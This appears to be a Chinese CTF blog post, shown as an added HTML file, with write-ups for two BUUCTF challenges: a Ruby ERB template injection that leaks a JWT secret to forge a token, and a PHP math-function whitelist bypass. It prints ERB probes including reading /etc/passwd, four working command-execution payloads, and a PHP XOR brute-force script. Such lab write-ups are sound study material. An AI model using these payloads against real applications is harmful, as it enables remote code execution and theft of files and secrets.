@@ -1,0 +1,620 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>buu（二） - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="buu（二）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-27 23:20" pubdate>
+        July 27, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">buu（二）</h1>
+            
+            <div class="markdown-body">
+              <h1>[SCTF2019]Flag Shop</h1>
+<h2 id="Ruby-ERB模板注入"><a class="header-anchor" href="#Ruby-ERB模板注入">🍭</a>Ruby ERB模板注入</h2>
+<p>Ruby/ERB代码语法中较有特征的就是<code>&lt;%=</code>,<code>&lt;%=</code>语法可以用来执行Ruby语句，并将结果转换为字符串。我们可用<code>ruby &lt;%= 7 * 7 %&gt;</code>来测试是否含有模板注入。若存在模板注入漏洞就可以用<code>ruby &lt;%= File.open(‘/etc/passwd’).read %&gt;</code>试试看能否自带的全局函数。</p>
+<p>一般系统阻止我们访问<strong>File.open</strong>函数。Ruby的ERB模板引擎包含一个安全级别（safe level）参数，当安全级别设置为0以上的某个值时，我们无法在模板绑定（template  binding）中执行包括文件操作在内的某些函数。4是最为严格的隔离机制，只能执行标记为可信状态的那些代码。这时我们需要尝试许多攻击面。</p>
+<p>如果我们想分析self对象（self-object），我们可以尝试枚举该对象可用的属性及方法：</p>
+<pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span> </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre>
+<p>获取self对象的类名：</p>
+<pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>.name </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre>
+<p>枚举此类的可用方法：</p>
+<pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.methods </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre>
+<p>根据返回的函数，思考哪些数据可以传递给这些函数，以实现未授权访问目的。Ruby提供了强大的元编程（metaprogramming）以及内省（introspection）功能，详见：<a target="_blank" rel="noopener" href="http://ruby-metaprogramming.rubylearning.com/">Metaprogramming in Ruby</a>。我们可以使用其中某些功能（如前面提到的类的.methods以及.name方法）来探索程序的内部结构。由于我们正往服务器发送HTTP POST请求，我们很有可能处于handlePOST或者doPOST函数内部。</p>
+<p>获取目标所需的具体参数：</p>
+<pre><code class="hljs erb"><span class="xml">ruby <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> <span class="hljs-keyword">self</span>.method(<span class="hljs-symbol">:handle_POST</span>).parameters </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre>
+<p>确认session对象的具体含义：</p>
+<pre><code class="hljs pgsql">ruby &lt;%= <span class="hljs-keyword">session</span>.<span class="hljs-keyword">class</span>.name %&gt;</code></pre>
+<p>通过调用.instance_variables方法查看对象包含哪些成员变量：</p>
+<pre><code class="hljs mel">ruby &lt;%=@server.instance_variables %&gt;</code></pre>
+<p>接下来找出可能会包含某些密钥或者其他有用的信息的变量。用&lt;%创建自己的局部变量，保存变量的引用（方便随后在模板中引用）</p>
+<pre><code class="hljs mel">ruby &lt;% ssl=@server.instance_variable_get(:变量名) %&gt;&lt;%= ssl.instance_variables %&gt;</code></pre>
+<p>提取变量值：</p>
+<pre><code class="hljs mel">ruby &lt;% ssl = @server.instance_variable_get(:变量名) %&gt;&lt;%= ssl.instance_variable_get(:值) %&gt;</code></pre>
+<p>详见：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">Ruby ERB模板注入</a></p>
+<h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4>
+<p>题目页面可以购买flag，robots.txt提示了<code>/filebak</code></p>
+<pre><code class="hljs elixir"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span>
+
+set <span class="hljs-symbol">:public_folder</span>, File.dirname(__FILE__) + <span class="hljs-string">&#x27;/static&#x27;</span>
+
+FLAGPRICE = <span class="hljs-number">1000000000000000000000000000</span>
+ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="hljs-number">64</span>)
+
+configure <span class="hljs-keyword">do</span>
+  enable <span class="hljs-symbol">:logging</span>
+  file = File.new(File.dirname(__FILE__) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)
+  file.sync = <span class="hljs-keyword">true</span>
+  <span class="hljs-keyword">use</span> Rack::CommonLogger, file
+<span class="hljs-keyword">end</span>
+
+get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span>
+  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span>
+<span class="hljs-keyword">end</span>
+
+get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span>
+  content_type <span class="hljs-symbol">:text</span>
+  erb IO.binread __FILE__
+<span class="hljs-keyword">end</span>
+
+get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span>
+  payload = &#123; <span class="hljs-symbol">uid:</span> SecureRandom.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;
+  auth = JWT.encode payload,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>
+  cookies[<span class="hljs-symbol">:auth</span>] = auth
+<span class="hljs-keyword">end</span>
+
+get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span>
+  islogin
+  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;
+  json(&#123;<span class="hljs-symbol">uid:</span> auth[0][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[0][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)
+<span class="hljs-keyword">end</span>
+
+get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span>
+  erb <span class="hljs-symbol">:shop</span>
+<span class="hljs-keyword">end</span>
+
+get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span>
+  islogin
+  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;
+  auth = auth[0]
+  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-keyword">nil</span>?
+    if ENV[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)
+      puts ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]
+    <span class="hljs-keyword">end</span>
+  <span class="hljs-keyword">end</span>
+
+  if params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][0,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span>
+
+    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="hljs-number">10</span>)
+    auth = JWT.encode auth,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>
+    cookies[<span class="hljs-symbol">:auth</span>] = auth
+    ERB::new(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][0,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result
+
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+
+post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span>
+  islogin
+  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;
+
+  if auth[0][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="hljs-keyword">then</span>
+
+    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)
+  else
+
+    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;
+    auth = JWT.encode auth,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>
+    cookies[<span class="hljs-symbol">:auth</span>] = auth
+    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">islogin</span></span>
+  if cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-keyword">nil</span>? <span class="hljs-keyword">then</span>
+    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span></code></pre>
+<p>work下有串代码：</p>
+<pre><code class="hljs markdown">if params[<span class="hljs-string">:do</span>] == &quot;#&#123;params[<span class="hljs-string">:name</span>][<span class="hljs-symbol">0,7</span>]&#125; is working&quot; then
+
+<span class="hljs-code">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span>
+<span class="hljs-code">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span>
+<span class="hljs-code">    cookies[:auth] = auth</span>
+<span class="hljs-code">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span></code></pre>
+<p>传入的do参数和name参数一致，会输出<code>&#123;params[:name][0,7]&#125; working successfully!</code></p>
+<p>ruby预定义中</p>
+<p><img src="/2021/07/27/ruby/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>构造<code>do=&lt;%=$'%&gt; is working</code>和<code>name=&lt;%=$'%&gt;</code>（内容16进制编码）</p>
+<p><img src="/2021/07/27/ruby/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>得到secret，JWT编码，jkl大于flag的价钱即可</p>
+<p><img src="/2021/07/27/ruby/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>传值</p>
+<p><img src="/2021/07/27/ruby/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>JWT解码</p>
+<p><img src="/2021/07/27/ruby/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">https://www.anquanke.com/post/id/86867</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/3596467969/">https://www.freesion.com/article/3596467969/</a></p>
+<h1>[CISCN 2019 初赛]Love Math</h1>
+<h4 id="前置知识"><a class="header-anchor" href="#前置知识">🍭</a>前置知识</h4>
+<p><strong>动态函数</strong></p>
+<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：<code>$function = &quot;sayHello&quot;;$function();</code></p>
+<p><strong>php中函数名默认为字符串</strong></p>
+<p>例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</p>
+<h4 id="解题-v2"><a class="header-anchor" href="#解题-v2">🍭</a>解题</h4>
+<p>源码限制了字符长度，列了一些黑名单，白名单只有数学函数和<code>. ^</code></p>
+<h5 id="payload1"><a class="header-anchor" href="#payload1">🍭</a>payload1:</h5>
+<pre><code class="hljs sqf">$<span class="hljs-literal">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));($$<span class="hljs-literal">pi</span>)&#123;<span class="hljs-literal">pi</span>&#125;(($$<span class="hljs-literal">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-literal">pi</span>=system&amp;<span class="hljs-built_in">abs</span>=tac <span class="hljs-built_in">flag</span>.php</code></pre>
+<blockquote>
+<p>base_convert(37907361743,10,36) =&gt; “hex2bin” dechex(1598506324) =&gt; “5f474554” $pi=hex2bin(“5f474554”) =&gt; $pi=“_GET”   //hex2bin将一串16进制数转换为二进制字符串 ($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs}  //{}可以代替[]</p>
+</blockquote>
+<h5 id="payload2"><a class="header-anchor" href="#payload2">🍭</a>payload2:</h5>
+<pre><code class="hljs angelscript">$pi=base_convert,$pi(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)($pi(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)</code></pre>
+<blockquote>
+<p>base_convert(696468,10,36) =&gt; “exec” $pi(8768397090111664438,10,30) =&gt; “getallheaders” exec(getallheaders(){1})</p>
+</blockquote>
+<p><strong>getallheaders</strong></p>
+<p>getallheaders —获取所有 HTTP 请求标头,返回当前请求中或**<code>false</code>**失败时所有 HTTP 标头的关联数组 。</p>
+<h5 id="payload3："><a class="header-anchor" href="#payload3：">🍭</a>payload3：</h5>
+<pre><code class="hljs lisp">//exec(&#x27;hex2bin(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)
+($pi=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>)))
+//system(&#x27;cat&#x27;.dechex(<span class="hljs-number">16</span>)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)
+base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</code></pre>
+<h5 id="payload4："><a class="header-anchor" href="#payload4：">🍭</a>payload4：</h5>
+<pre><code class="hljs angelscript">$pi=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));$pi=$$pi;$pi&#123;<span class="hljs-number">0</span>&#125;($pi&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat%<span class="hljs-number">20</span>/flag</code></pre>
+<p><img src="/2021/07/27/ruby/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>脚本：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$payload = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>,  <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span> , <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];
+<span class="hljs-keyword">for</span>($k=<span class="hljs-number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;
+    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>;$i &lt; <span class="hljs-number">9</span>; $i++)&#123;
+        <span class="hljs-keyword">for</span>($j = <span class="hljs-number">0</span>;$j &lt;=<span class="hljs-number">9</span>;$j++)&#123;
+            $exp = $payload[$k] ^ $i.$j;
+            <span class="hljs-keyword">echo</span>($payload[$k].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html#%E6%80%9D%E8%B7%AF%E4%BA%8C">https://www.cnblogs.com/20175211lyz/p/11588219.html#思路二</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%88%B7%E9%A2%98/">刷题</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/php/">php</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Ruby-ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">Ruby ERB模板注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/29/session/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buu（三）</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/26/shell-1/">
+                        <span class="hidden-mobile">无字母数字shell</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
